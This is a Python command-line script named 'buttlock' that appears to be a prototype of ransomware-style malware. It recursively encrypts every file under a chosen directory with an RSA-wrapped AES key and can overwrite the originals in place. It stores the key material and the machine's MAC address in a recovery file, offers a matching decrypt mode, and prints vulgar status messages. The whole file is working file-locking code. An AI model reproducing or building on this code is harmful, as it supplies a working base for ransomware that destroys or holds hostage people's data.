from core import Buttdecryptor, Buttnet, Buttencryptor
import base64
import click
import os
from os.path import abspath
import glob

@click.command()
@click.option("--mode", default="encrypt", help="buttlock mode. encrypt for encrypt disk and decrypt for decrypt disk")
@click.option("--dir", help="path to directory that you want to encrypt")
@click.option("--recovery", default="./temp", help="Path to the recovery file")
@click.option("--replace", default="copy", help="If you wish that buttlock replace the original file set mode to replace, otherwise buttlock will create a encrypted copy.")
def buttlock(mode, dir, recovery, replace):
    if mode == "encrypt" and dir is not None:
        print("it's raining dicks down on your disk")

        if not os.path.exists("./buttlock"):
            os.makedirs("./buttlock")
       
        buttencrypt = Buttencryptor.Buttencryptor()
        encrypted_aes_key = buttencrypt.RSAEncryptContent(buttencrypt.getAesKey())
        base64_private_key = base64.b64encode(buttencrypt.getPrivateKey())

        with open("./buttlock/buttlock_recovery", "wb+") as crypto_out:
            crypto_out.write(encrypted_aes_key)
            crypto_out.write(str(";").encode('utf-8'))
            crypto_out.write(str(Buttnet.getMacAddress()).encode('utf-8'))
            crypto_out.write(str(";").encode('utf-8'))
            crypto_out.write(base64_private_key)

        source_dir = abspath(dir)
        print("dicking all files in: " + source_dir)

        files = [f for f in glob.glob(source_dir+"/**/*.*", recursive=True)]

        for file in files:
            with open(file, "rb") as in_file:
                encrypted_content = buttencrypt.encryptContent(in_file.read())
                if replace == "replace":
                    with open(file, "wb+") as out_file:
                        out_file.write(encrypted_content)
                else:
                    with open(file+".buttlock", "wb+") as out_file:
                        out_file.write(encrypted_content)

    if mode == "decrypt" and dir is not None and recovery is not None:
        print("undicking your disk")    

        with open(recovery, "rb") as crypto_in:
            crypto_in_arr = crypto_in.read().decode("utf-8").split(";")
            
            encrypted_aes_key = crypto_in_arr[0].strip()
            mac_address = crypto_in_arr[1]
            private_key = base64.b64decode(crypto_in_arr[2].strip())

            buttdecrypt = Buttdecryptor.Buttdecrypt()
            decrypted_aes_key = buttdecrypt.RSADecryptContent(base64.b64decode(encrypted_aes_key), private_key)
            aes_key = decrypted_aes_key[:32]
            aes_iv = decrypted_aes_key[32:]

            source_dir = abspath(dir)
            print("un-dicking all files in: " + source_dir)

            files = [f for f in glob.glob(source_dir+"/**/*.*", recursive=True)]

            for file in files:
                with open(file, "rb") as encrypted_input:
                    try:
                        decrypted = buttdecrypt.decryptContent(aes_key, aes_iv, encrypted_input.read())
                        with open(file, "wb") as out_file:
                            out_file.write(decrypted)
                    except Exception as e:
                        print(e)
                        print("not an encrypted file")



if __name__ == '__main__':
    buttlock()